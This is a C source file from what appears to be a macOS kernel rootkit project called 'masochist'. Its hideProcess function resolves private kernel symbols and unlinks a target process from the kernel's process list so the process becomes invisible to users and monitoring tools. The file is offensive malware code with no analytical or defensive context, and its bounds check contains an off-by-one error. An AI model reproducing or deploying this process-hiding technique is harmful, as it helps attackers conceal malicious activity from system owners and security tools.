//
//  process.c
//  masochist
//
//  Created by Squiffy on 11/11/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include "process.h"
#include "symbol.h"

#define MAX_HIDDEN_PROCS 100
struct proc *hiddenProcs[MAX_HIDDEN_PROCS];
unsigned int hiddenCount = 0;

kern_return_t
hideProcess(pid_t pid) {
    
    /* Find the required symbols */
    struct proclist *allproc = find_symbol("_allproc");
    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
    
    /* Make sure they're all resolved */
    if(!allproc || !proc_list_lock || !proc_list_unlock)
        return KERN_FAILURE;
    
    struct proc *process = NULL;
    
    /* Iterate through the entire process list just like Apple does */
    for (process = allproc->lh_first; process != 0; process = process->p_list.le_next) {
        
        /* If process is the process we're looking for, hide it */
        if(process->p_pid == pid) {
            /* XXX: Save into an array of hidden processes so we can recover it later */
            
            /* Lock the process list before we modify it */
            proc_list_lock();
            
            /* Actually hdie the process. */
            LIST_REMOVE(process, p_list);
            
            if(hiddenCount <= MAX_HIDDEN_PROCS) {
                hiddenProcs[hiddenCount] = process;
                hiddenCount++;
            }
            
            /* Unlock the list */
            proc_list_unlock();
            
            return KERN_SUCCESS;
        }
        
    }
    
    return KERN_SUCCESS;
    
}

kern_return_t
showProcess(pid_t process) {
    
    return KERN_FAILURE;
}
